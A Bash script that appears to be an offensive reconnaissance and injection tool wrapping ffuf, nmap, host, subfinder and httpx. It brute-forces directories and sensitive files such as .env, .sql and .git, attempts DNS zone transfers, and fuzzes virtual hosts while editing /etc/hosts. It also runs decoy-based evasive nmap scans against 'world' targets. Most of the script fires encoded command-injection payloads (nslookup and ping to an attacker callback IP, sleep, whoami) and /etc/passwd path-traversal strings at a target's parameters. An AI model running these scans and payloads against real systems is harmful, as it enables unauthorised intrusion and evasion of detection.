#!/bin/bash

############################## Gr33tz: R3tr0 | Kirito
# */ script author: nowak */ #
# */  the recon is a art  */ # /* https://discord.gg/PePM2NR5zS ~/
#    */   v1.2.5-dev   /*    # /~ https://github.com/nowak0x01 */
# $/  hackingforce family #/ #
##############################

TheFather_Of_The_G0ds_Kirito=$1
TheMan_TheBeast_HeIs_R3tr074=$6

# regex to clean "/" and "."
prog_name=${0##*/}

HELP="
$prog_name ({program}) ({options})

	$prog_name ffuf +options+
	$prog_name nmap +options+
	$prog_name wordgen +options+
	$prog_name zonetransfer +options+
	$prog_name dnslookup +options+
	$prog_name vhosts +options+
	$prog_name subdomains +options+
	$prog_name web-tecnology +options+
	$prog_name parameters +options+
\n"

export HOME=$(grep $USER /etc/passwd | cut -d':' -f6)
export PATH="/opt:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:${HOME}/go:${HOME}/local:${HOME}:$PATH"

verify()
{
	if [ "$(which $1 2>/dev/null)" = "" ];then
		printf "\n\e[1;31mERROR:\e[1;37m $1 command \e[0mnot found in\e[1;37m $PATH \e[0m\n\n"
		exit 1
	fi
}

case "$TheFather_Of_The_G0ds_Kirito" in

	'ffuf'|'FFUF'|'fuff'|'FUFF')

		verify ffuf
		if [ "$4" == "" ];then
			printf "\n$prog_name %s (dir/files) (wordlist) (target) +more options+\n\n" "$TheFather_Of_The_G0ds_Kirito"
			exit 1
		fi

		# [ DEFAULT ] - EXTENSIONS='.yml,.yaml,.passwd,.conf,.php,.js,.html,.save,.swp,.bkp,.bak,.sql,.db,.ovpn,.md,.env,~,.json,.old,.log,.tar,.tar.gz,.gz,.tgz,.settings,.zip,.rar,.backup,.out,.info,.main,.master,.local,.inf,.git,.disabled,.dev,.default,.cnf,.cgi,.cer,.bin,.tmp,.temp'
		# [ ASP.NET/IIS ] - EXTENSIONS='.asp,.aspx,.cfg,.config,.zip,.xml,.svn,.svnignore,.web,.dll,.exe,.wasm,.wadl,.axd,.resx,.resouces,.wsdl,.xsd,.disco,.discomap,.config,.htm,.pdb,.ashx,.cs,.sln,.asax'
		# [ JAVA ] - EXTENSIONS='.jsp,.jsf,.xhtml,.xml,.class,.java,.jar,.seam,.faces,.shtml,.ifaces,.do,.action,.jspf,.properties'

		THREADS='110'
		EXTENSIONS='.passwd,.conf,.php,.js,.html,.save,.swp,.bkp,.bak,.sql,.db,.ovpn,.md,.env,~,.json,.old,.log,.tar,.tar.gz,.gz,.tgz,.settings,.zip,.rar,.backup,.out,.info,.main,.master,.local,.inf,.git,.disabled,.dev,.default,.cnf,.cgi,.cer,.bin,.tmp,.temp'
		UAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60'

		if [[ "$2" == "DIR" || "$2" == "dir" ]];then

			printf "\n\e[1;37m=> TARGET:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m (DIRECTORIES) \e[1;37m| THREADS:\e[1;32m $THREADS \e[1;37m<=\e[0m\n\n"
			ffuf -ic -recursion -w $3 -u $4 -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 16 -mc all -ac "${@:5}"

		elif [[ "$2" == "files" || "$2" == "FILES" ]];then

			printf "\n\e[1;37m=> TARGET:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m (FILES-DEFAULT) \e[1;37m| THREADS:\e[1;32m $THREADS \e[1;37m<=\e[0m\n\n"
			ffuf -ic -w $3 -u $4 -H "User-Agent: $UAGENT" -c -e "$EXTENSIONS" -t $THREADS --timeout 16 -mc all -ac "${@:5}"
			cut -d'.' -f1 $3 | sort -u > /var/tmp/hfscan-files.txt
			printf "\n\e[1;37m=> TARGET:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m (FILES-CHANGED) \e[1;37m| THREADS:\e[1;32m $THREADS \e[1;37m<=\e[0m\n\n"
			ffuf -ic -w /var/tmp/hfscan-files.txt -u $4 -H "User-Agent: $UAGENT" -c -e "$EXTENSIONS" -t $THREADS --timeout 16 -mc all -ac "${@:5}"
		fi
		;;

	'nmap'|'NMAP')

		verify nmap
		if [ "$3" == "" ];then
			printf "\n$prog_name %s (ctf/world) (target)\n\n" "$TheFather_Of_The_G0ds_Kirito"
			exit 1
		fi

		if [[ "$2" == "ctf" || "$2" == "CTF" ]];then

			SYN_scan="-sSVC -Pn -T4 --min-rate 10000 -p-"
			TCP_scan="-sTVC -Pn -T4 --min-rate 10000 -p-"
			UDP_scan="-sUV -Pn -T4 --min-rate 10000 -p-"

			printf "\n\e[1;37m=> starting the scan \e[1;32m(CTF - syn) \e[1;37m<=\n\n"
			nmap $SYN_scan $3
			printf "\n\e[1;37m=> starting the scan \e[1;32m(CTF - tcp) \e[1;37m<=\n\n"
			nmap $TCP_scan $3
			printf "\n\e[1;37m=> starting the scan \e[1;32m(CTF - udp) \e[1;37m<=\n\n"
			nmap $UDP_scan $3

		elif [[ "$2" == "world" || "$2" == "WORLD" ]];then

			SYN_scan="-sS -Pn -T2 -D RND:126 -g 80 -p-"
			TCP_scan="-sT -Pn -T2 -D RND:126 -g 80 -p-"
			UDP_scan="-sUV -Pn -T2 -D RND:126 -g 80 -p-"

			printf "\n\e[1;37m=> starting the scan \e[1;32m(WORLD - syn) \e[1;37m<=\n\n"
			nmap $SYN_scan $3
			printf "\n\e[1;37m=> starting the scan \e[1;32m(WORLD - tcp) \e[1;37m<=\n\n"
			nmap $TCP_scan $3
			printf "\n\e[1;37m=> starting the scan \e[1;32m(WORLD - udp) \e[1;37m<=\n\n"
			nmap $UDP_scan $3
		fi
		;;

	'wg'|'wordgen'|'WG'|'WORDGEN')

		if [ "$3" == "" ];then

			printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito (wordlist) (words {separated by: ','})\n
	{example}\n
		$prog_name $TheFather_Of_The_G0ds_Kirito ./files-wordlist.txt 'corpsec, sec, corp'
\n"
			exit 1
		fi

		function add_char()
		{
			printf "%s$1%s\n" "$_generate_" "$(head -n$_quant_ hfscan-words.quant | tail -1)" >> custom-wordlist.hfscan
			printf "%s$1%s\n" "$(head -n$_quant_ hfscan-words.quant | tail -1)" "$_generate_" >> custom-wordlist.hfscan
		}

		rm -f custom-wordlist.hfscan
		printf $3 > hfscan.words
		tr ',' '\n' < hfscan.words > hfscan-words.quant
		echo >> hfscan-words.quant

		spin='-\|/'

		printf "\n\e[1;32m=>\e[1;37m Generating the custom Wordlist \e[1;32m<=\e[1;37m\n\n"

		for _quant_ in $(seq 1 `wc -l hfscan-words.quant | cut -d' ' -f1`);do
			for _generate_ in $(cut -d'.' -f1 $2);do

				add_char -
				add_char .
				add_char _

				i=$(( (i+1) %4 ))
				printf "\r${spin:$i:1}"
			done
		done

		printf "\n\e[1;32m=>\e[1;37m Custom Wordlist generated! \e[1;32m<=\e[1;37m\n"
		printf "\e[1;32m%s \e[0m\n\n" "`ls -gG custom-wordlist.hfscan | awk '{print $1, $3, $6, $7}'`"

		rm -f hfscan-words.quant hfscan.words
		;;

	'ZN'|'zn'|'zonetransfer'|'ZONETRANSFER')

			verify host
			if [ $# -ne 2 ];then
				printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito [host]\n\n"
			else
				printf "\n\e[0m\e[1;32m=> \e[1;37mName Servers \e[1;32m<=\e[0m\n\n";host -t ns $2|cut -d" " -f4
				printf "\n\e[1;32m::::::::::::::::::::::::::::::::::\n"

				for __nameserver__ in $(host -t ns $2|cut -d' ' -f4);do
					printf "\n \e[0m# \e[1;32mNAME-SERVER: %s \e[0m#\n" "$__nameserver__"
					host -t axfr $2 $__nameserver__ | grep -iEv 'Using domain server|Name:|Address|Aliases|Transfer failed|REFUSED|Trying'
				done
				echo
			fi
			;;

	'DNS'|'dns'|'dnslookup'|'DNSLOOKUP')

		verify host
		if [ $# -ne 2 ];then
			printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito [host]\n\n"
		else
			printf 'A\nAAAA\nAFSDB\nAPL\nCAA\nCDNSKEY\nCDS\nCERT\nCNAME\nCSYNC\nDHCID\nDLV\nDNAME\nDNSKEY\nDS\nEUI48\nEUI64\nHINFO\nHIP\nIPSECKEY\nKEY\nKX\nLOC\nMX\nNAPTR\nNS\nNSEC\nNSEC3\nNSEC3PARAM\nOPENPGPKEY\nPTR\nRRSIG\nRP\nSIG\nSMIMEA\nSOA\nSRV\nSSHFP\nTA\nTKEY\nTLSA\nTSIG\nTXT\nURI\nZONEMD\nMD\nMF\nMAILA\nMB\nMG\nMR\nMINFO\nMAILB\nWKS\nNULL\nA6\nNXT\nKEY\nSIG\nRP\nX25\nISDN\nRT\nNSAP\nNSAP-PTR\nPX\nEID\nNIMLOC\nATMA\nAPL\nSINK\nGPOS\nUINFO\nUID\nGID\nUNSPEC\nSPF\nNINFO\nRKEY\nTALINK\nNID\nL32\nL64\nLP\nDOA' > __dns.records
			printf "\n\e[1;32m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m\n\n"

			for __dnsrecord__ in $(cat __dns.records);do
				host -t $__dnsrecord__ $2 | grep -iEv 'has no|SERVFAIL'
			done

			printf "\n\n\e[1;32m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m\n\n"
			rm -f __dns.records
		fi
		;;

	'vhosts'|'vhost'|'VHOSTS'|'VHOST')

		verify ffuf
		verify curl
		UAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60'
		_defaultSize="$(curl -sk $4://$2|wc -c)"
		THREADS='110'

		if [ $# -ne 5 ];then
			printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito [host] [wordlist] [http/https] [ip]\n\n"

		elif [ "$(id -u)" != "0" ];then
			printf "\n\e[1;31mERROR:\e[0m only root!\n\n"

		elif [ ! -f $3 ];then
			printf "\n\e[1;31mERROR:\e[0m wordlist: %s not found\n\n" "$2"

		elif ! [[ "$4" == "http" || "$4" == "https" ]];then
			printf "\n\e[1;31mERROR:\e[0m only http or https\n\n"

		else

			[ "$(grep -E '$5|$2' /etc/hosts)" != "0" ] && printf "\n$5 $2 " >> /etc/hosts

			printf "\n\e[1;32m=>\e[0m Searching VHOSTS on:\e[1;37m $4://$2/ \e[1;32m<=\e[0m\n\n"
			ffuf -u $4://$2/ -H "Host: FUZZ.$2" -H "User-Agent: $UAGENT" -ac -ic -c -t $THREADS -noninteractive -s --timeout 23 -mc all -w $3 > vhosts.$2

			if [ "$(wc -l vhosts.$2|cut -d' ' -f1)" == "0" ];then
				printf "\n::::\e[1;32m NO VHOSTS FOUND\e[0m ::::\n\n"
				rm -f vhosts.$2 vhosts.$2.size vhosts.$2.valids vhosts.$2_curl
				exit 1
			fi

			for _vCurl in $(cat vhosts.$2);do
				printf "$_vCurl.$2 " >> vhosts.$2_curl
			done

			cp /etc/hosts /etc/hosts.bkp
			tr '\n' ' ' < vhosts.$2_curl >> /etc/hosts

			for _vHost in $(cat vhosts.$2);do
				if [[ "$(curl -m 5 -sk $4://$_vHost.$2 | wc -c)" != "0" || "$(curl -m 5 -sk $4://$_vHost.$2 | wc -c)" != "$_defaultSize" ]];then
					printf ":::: host-> %s :::: \e[1;32m200 OK\e[0m\n" "$4://$_vHost.$2/" | tee -a vhosts.$2.size
				fi
			done

			if [ ! -f vhosts.$2.size ];then
				mv /etc/hosts.bkp /etc/hosts
				printf "\n::::\e[1;32m NO VHOSTS FOUND\e[0m ::::\n\n"
				rm -f vhosts.$2 vhosts.$2.size vhosts.$2.valids vhosts.$2_curl
				exit 1
			fi

			cut -d '/' -f3 vhosts.$2.size > vhosts.$2.valids
			tr '\n' ' ' < vhosts.$2.valids >> /etc/hosts

			printf "\n\e[1;32m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m\n\n%s\n\n\e[1;32m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m\n\n" "$(cat /etc/hosts)"

		fi

		rm -f vhosts.$2 vhosts.$2.size vhosts.$2.valids vhosts.$2_curl
		;;


	'subdomain'|'subdomains'|'SUBDOMAIN'|'SUBDOMAINS'|'sub'|'SUB')

		verify subfinder
		if [ $# -ne 2 ];then
			printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito [host]\n\n"
		else
			printf "\n\e[1;32m:::::::::::::::::::::::::::::::::::::::\e[0m\n\n"
			subfinder -all -silent -recursive -nW -o hfscan_subdomains.subfinder -d $2
			printf "\n\e[1;32m:::::::::::::::::::::::::::::::::::::::\e[0m\n\n"
		fi
		;;

	'web-tecnology'|'web'|'WEB'|'WEB-TECNOLOGY'|'httpx'|'HTTPX')

		verify httpx
		if [ $# -ne 2 ];then
			printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito [targets-wordlist]\n\n"
			exit 1
		elif [ ! -f $2 ];then
			printf "\n\e[1;31mERROR:\e[0m targets-wordlist not found!\n\n"
			exit 1
		else
			printf "\n\e[1;32m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m\n\n"
			httpx -l $2 -silent -follow-redirects -status-code -tech-detect -web-server -ip -cname -cdn -method -ports 80,443,8080,8000,3000,3333,9001,22,2222 -websocket -o hfscan_webtecnology.httpx
			printf "\n\e[1;32m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m\n\n"
		fi
		;;

		'parameters'|'PARAMETERS'|'params'|'PARAMS')

			verify ffuf
			if [ "$2" == "" ];then
				printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito (discovery / brute)\n\n"
				exit 1
			elif [[ "$2" == "DISCOVERY" || "$2" == "discovery" ]];then
				if [ $# -ne 6 ];then
					printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito $2 (GET/POST) ./parameters-list.txt https://hackingforce.com.br/upload.php (blind/default)\n
{example}

	$prog_name $TheFather_Of_The_G0ds_Kirito $2 POST ./parameters-list.txt https://hackingforce.com.br/painel.php BLIND
	$prog_name $TheFather_Of_The_G0ds_Kirito $2 GET ./parameters-list.txt https://hackingforce.com.br/upload.php DEFAULT
\n"
					exit 1
				else

					THREADS='50'
					UAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60'

					function GET_REQ()
					{
						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| PAYLOAD:\e[1;32m $1 \e[1;37m| METHOD:\e[1;32m GET \e[1;37m<=\e[0m\n"

						if [[ "$TheMan_TheBeast_HeIs_R3tr074" == "BLIND" || "$TheMan_TheBeast_HeIs_R3tr074" == "blind" ]];then
							ffuf -s -mt '<8000' -ic -w $2 -u $3?FUZZ=$1 -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
						else
							ffuf -s -ic -w $2 -u $3?FUZZ=$1 -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
						fi
					}

					function POST_REQ()
					{
						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| PAYLOAD:\e[1;32m $1 \e[1;37m| METHOD:\e[1;32m POST \e[1;37m<=\e[0m\n"

						if [[ "$TheMan_TheBeast_HeIs_R3tr074" == "BLIND" || "$TheMan_TheBeast_HeIs_R3tr074" == "blind" ]];then
							ffuf -s -mt '<8000' -X POST -ic -w $2 -u $3 -d "FUZZ=$1" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
						else
							ffuf -s -X POST -ic -w $2 -u $3 -d "FUZZ=$1" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
						fi
					}

					if [[ "$3" == "GET" || "$3" == "get" ]];then

						if [[ "$TheMan_TheBeast_HeIs_R3tr074" == "BLIND" || "$TheMan_TheBeast_HeIs_R3tr074" == "blind" ]];then
							printf "\nEnter your IP (VPS/BurpCollaborator): "; read IP

							GET_REQ "nslookup+$IP" $4 $5
							GET_REQ "nslookup%2B$IP" $4 $5
							GET_REQ "nslookup%252B$IP" $4 $5
							GET_REQ ";nslookup+$IP;" $4 $5
							GET_REQ "%3Bnslookup%2B$IP%3B" $4 $5
							GET_REQ "%253Bnslookup%252B$IP%253B" $4 $5
							GET_REQ "|nslookup+$IP" $4 $5
							GET_REQ "%7Cnslookup%2B$IP" $4 $5
							GET_REQ "%257Cnslookup%252B$IP" $4 $5
							GET_REQ "|nslookup+$IP|" $4 $5
							GET_REQ "%7Cnslookup%2B$IP%7C" $4 $5
							GET_REQ "%257Cnslookup%252B$IP%257C" $4 $5
							GET_REQ "&nslookup+$IP&" $4 $5
							GET_REQ "%26nslookup%2B$IP%26" $4 $5
							GET_REQ "%2526nslookup%252B$IP%2526" $4 $5
							GET_REQ "ping+$IP" $4 $5
							GET_REQ "ping%2B$IP" $4 $5
							GET_REQ "ping%252B$IP" $4 $5
							GET_REQ ";ping+$IP;" $4 $5
							GET_REQ "%3Bping%2B$IP%3B" $4 $5
							GET_REQ "%253Bping%252B$IP%253B" $4 $5
							GET_REQ "|ping+$IP" $4 $5
							GET_REQ "%7Cping%2B$IP" $4 $5
							GET_REQ "%257Cping%252B$IP" $4 $5
							GET_REQ "|ping+$IP|" $4 $5
							GET_REQ "%7Cping%2B$IP%7C" $4 $5
							GET_REQ "%257Cping%252B$IP%257C" $4 $5
							GET_REQ "&ping+$IP&" $4 $5
							GET_REQ "%26ping%2B$IP%26" $4 $5
							GET_REQ "%2526ping%252B$IP%2526" $4 $5
							GET_REQ "sleep+30" $4 $5
							GET_REQ "sleep%2B30" $4 $5
							GET_REQ "sleep%252B30" $4 $5
							GET_REQ ";sleep+30;" $4 $5
							GET_REQ "%3Bsleep%2B30%3B" $4 $5
							GET_REQ "%253Bsleep%252B30%253B" $4 $5
							GET_REQ "|sleep+30" $4 $5
							GET_REQ "%7Csleep%2B30" $4 $5
							GET_REQ "%257Csleep%252B30" $4 $5
							GET_REQ "|sleep+30|" $4 $5
							GET_REQ "%7Csleep%2B30%7C" $4 $5
							GET_REQ "%257Csleep%252B30%257C" $4 $5
							GET_REQ "&sleep+30&" $4 $5
							GET_REQ "%26sleep%2B30%26" $4 $5
							GET_REQ "%2526sleep%252B30%2526" $4 $5
							GET_REQ "timeout+30s+tail+-f" $4 $5
							GET_REQ "timeout%2B30s%2Btail%2B-f" $4 $5
							GET_REQ "timeout%252B30s%252Btail%252B-f" $4 $5
							GET_REQ ";timeout+30s+tail+-f;" $4 $5
							GET_REQ "%3Btimeout%2B30s%2Btail%2B-f%3B" $4 $5
							GET_REQ "%253Btimeout%252B30s%252Btail%252B-f%253B" $4 $5
							GET_REQ "|timeout+30s+tail+-f" $4 $5
							GET_REQ "%7Ctimeout%2B30s%2Btail%2B-f" $4 $5
							GET_REQ "%257Ctimeout%252B30s%252Btail%252B-f" $4 $5
							GET_REQ "|timeout+30s+tail+-f|" $4 $5
							GET_REQ "%7Ctimeout%2B30s%2Btail%2B-f%7C" $4 $5
							GET_REQ "%257Ctimeout%252B30s%252Btail%252B-f%257C" $4 $5
							GET_REQ "&timeout+30s+tail+-f&" $4 $5
							GET_REQ "%26timeout%2B30s%2Btail%2B-f%26" $4 $5
							GET_REQ "%2526timeout%252B30s%252Btail%252B-f%2526" $4 $5

						else

							GET_REQ 'whoami' $4 $5
							GET_REQ "|whoami" $4 $5
							GET_REQ "%7Cwhoami" $4 $5
							GET_REQ "%257Cwhoami" $4 $5
							GET_REQ "&whoami&" $4 $5
							GET_REQ "%26whoami%26" $4 $5
							GET_REQ "%2526whoami%2526" $4 $5
							GET_REQ ";whoami;" $4 $5
							GET_REQ "%3Bwhoami%3B" $4 $5
							GET_REQ "%253Bwhoami%253B" $4 $5
							GET_REQ '1' $4 $5
							GET_REQ '0' $4 $5
							GET_REQ 'true' $4 $5
							GET_REQ 'false' $4 $5
							GET_REQ '/etc/passwd' $4 $5
							GET_REQ '%2Fetc%2Fpasswd' $4 $5
							GET_REQ '%252Fetc%252Fpasswd' $4 $5
							GET_REQ 'index.php' $4 $5
							GET_REQ 'index.html' $4 $5
							GET_REQ '/.././.././.././.././.././.././.././.././../etc/passwd' $4 $5
							GET_REQ '%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2Fetc%2Fpasswd' $4 $5
							GET_REQ '%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252Fetc%252Fpasswd' $4 $5

						fi

					elif [[ "$3" == "POST" || "$3" == "post" ]];then

						if [[ "$TheMan_TheBeast_HeIs_R3tr074" == "BLIND" || "$TheMan_TheBeast_HeIs_R3tr074" == "blind" ]];then
							printf "\nEnter your IP (VPS/BurpCollaborator): "; read IP

							POST_REQ "nslookup+$IP" $4 $5
							POST_REQ "nslookup%2B$IP" $4 $5
							POST_REQ "nslookup%252B$IP" $4 $5
							POST_REQ ";nslookup+$IP;" $4 $5
							POST_REQ "%3Bnslookup%2B$IP%3B" $4 $5
							POST_REQ "%253Bnslookup%252B$IP%253B" $4 $5
							POST_REQ "|nslookup+$IP" $4 $5
							POST_REQ "%7Cnslookup%2B$IP" $4 $5
							POST_REQ "%257Cnslookup%252B$IP" $4 $5
							POST_REQ "|nslookup+$IP|" $4 $5
							POST_REQ "%7Cnslookup%2B$IP%7C" $4 $5
							POST_REQ "%257Cnslookup%252B$IP%257C" $4 $5
							POST_REQ "&nslookup+$IP&" $4 $5
							POST_REQ "%26nslookup%2B$IP%26" $4 $5
							POST_REQ "%2526nslookup%252B$IP%2526" $4 $5
							POST_REQ "ping+$IP" $4 $5
							POST_REQ "ping%2B$IP" $4 $5
							POST_REQ "ping%252B$IP" $4 $5
							POST_REQ ";ping+$IP;" $4 $5
							POST_REQ "%3Bping%2B$IP%3B" $4 $5
							POST_REQ "%253Bping%252B$IP%253B" $4 $5
							POST_REQ "|ping+$IP" $4 $5
							POST_REQ "%7Cping%2B$IP" $4 $5
							POST_REQ "%257Cping%252B$IP" $4 $5
							POST_REQ "|ping+$IP|" $4 $5
							POST_REQ "%7Cping%2B$IP%7C" $4 $5
							POST_REQ "%257Cping%252B$IP%257C" $4 $5
							POST_REQ "&ping+$IP&" $4 $5
							POST_REQ "%26ping%2B$IP%26" $4 $5
							POST_REQ "%2526ping%252B$IP%2526" $4 $5
							POST_REQ "sleep+30" $4 $5
							POST_REQ "sleep%2B30" $4 $5
							POST_REQ "sleep%252B30" $4 $5
							POST_REQ ";sleep+30;" $4 $5
							POST_REQ "%3Bsleep%2B30%3B" $4 $5
							POST_REQ "%253Bsleep%252B30%253B" $4 $5
							POST_REQ "|sleep+30" $4 $5
							POST_REQ "%7Csleep%2B30" $4 $5
							POST_REQ "%257Csleep%252B30" $4 $5
							POST_REQ "|sleep+30|" $4 $5
							POST_REQ "%7Csleep%2B30%7C" $4 $5
							POST_REQ "%257Csleep%252B30%257C" $4 $5
							POST_REQ "&sleep+30&" $4 $5
							POST_REQ "%26sleep%2B30%26" $4 $5
							POST_REQ "%2526sleep%252B30%2526" $4 $5
							POST_REQ "timeout+30s+tail+-f" $4 $5
							POST_REQ "timeout%2B30s%2Btail%2B-f" $4 $5
							POST_REQ "timeout%252B30s%252Btail%252B-f" $4 $5
							POST_REQ ";timeout+30s+tail+-f;" $4 $5
							POST_REQ "%3Btimeout%2B30s%2Btail%2B-f%3B" $4 $5
							POST_REQ "%253Btimeout%252B30s%252Btail%252B-f%253B" $4 $5
							POST_REQ "|timeout+30s+tail+-f" $4 $5
							POST_REQ "%7Ctimeout%2B30s%2Btail%2B-f" $4 $5
							POST_REQ "%257Ctimeout%252B30s%252Btail%252B-f" $4 $5
							POST_REQ "|timeout+30s+tail+-f|" $4 $5
							POST_REQ "%7Ctimeout%2B30s%2Btail%2B-f%7C" $4 $5
							POST_REQ "%257Ctimeout%252B30s%252Btail%252B-f%257C" $4 $5
							POST_REQ "&timeout+30s+tail+-f&" $4 $5
							POST_REQ "%26timeout%2B30s%2Btail%2B-f%26" $4 $5
							POST_REQ "%2526timeout%252B30s%252Btail%252B-f%2526" $4 $5

						else

							POST_REQ 'whoami' $4 $5
							POST_REQ "|whoami" $4 $5
							POST_REQ "%7Cwhoami" $4 $5
							POST_REQ "%257Cwhoami" $4 $5
							POST_REQ "&whoami&" $4 $5
							POST_REQ "%26whoami%26" $4 $5
							POST_REQ "%2526whoami%2526" $4 $5
							POST_REQ ";whoami;" $4 $5
							POST_REQ "%3Bwhoami%3B" $4 $5
							POST_REQ "%253Bwhoami%253B" $4 $5
							POST_REQ '1' $4 $5
							POST_REQ '0' $4 $5
							POST_REQ 'true' $4 $5
							POST_REQ 'false' $4 $5
							POST_REQ '/etc/passwd' $4 $5
							POST_REQ '%2Fetc%2Fpasswd' $4 $5
							POST_REQ '%252Fetc%252Fpasswd' $4 $5
							POST_REQ 'index.php' $4 $5
							POST_REQ 'index.html' $4 $5
							POST_REQ '/.././.././.././.././.././.././.././.././../etc/passwd' $4 $5
							POST_REQ '%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2Fetc%2Fpasswd' $4 $5
							POST_REQ '%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252Fetc%252Fpasswd' $4 $5
						fi
					fi
				fi

			elif [[ "$2" == "BRUTE" || "$2" == "brute" ]];then

				if [ $# -ne 6 ];then
					printf "\n$prog_name $TheFather_Of_The_G0ds_Kirito $2 (GET/POST) (PARAMETER) ./pathTransversal-CommandExec-list.txt https://hackingforce.com.br/dev.php\n
{example}

	$prog_name $TheFather_Of_The_G0ds_Kirito $2 POST 'share' ./pathTransversal-CommandExec-list.txt https://hackingforce.com.br/dev.php
\n"
					exit 1
				else

					THREADS='110'
					UAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60'

					if [[ "$3" == "GET" || "$3" == "get" ]];then
						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $TheMan_TheBeast_HeIs_R3tr074 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m GET (TIME-BASED) \e[1;37m<=\e[0m\n\n"
						ffuf -mt '<8000' -ic -w $5 -u $TheMan_TheBeast_HeIs_R3tr074?$4=FUZZ -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $TheMan_TheBeast_HeIs_R3tr074 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m GET (DEFAULT) \e[1;37m<=\e[0m\n\n"
						ffuf -ic -w $5 -u $TheMan_TheBeast_HeIs_R3tr074?$4=FUZZ -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac

					elif [[ "$3" == "POST" || "$3" == "post" ]];then
						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $TheMan_TheBeast_HeIs_R3tr074 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m POST (TIME-BASED) \e[1;37m<=\e[0m\n\n"
						ffuf -X POST -mt '<8000' -ic -w $5 -u $TheMan_TheBeast_HeIs_R3tr074 -d "$4=FUZZ" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $TheMan_TheBeast_HeIs_R3tr074 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m POST (DEFAULT) \e[1;37m<=\e[0m\n\n"
						ffuf -X POST -ic -w $5 -u $TheMan_TheBeast_HeIs_R3tr074 -d "$4=FUZZ" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac

					fi
				fi

			else

				printf "\n\e[1;31mERROR:\e[1;37m only DISCOVERY or BRUTE \e[0m\n\n"
				exit 1
			fi
			;;

	*)
		printf "$HELP"
		exit 1
		;;
esac
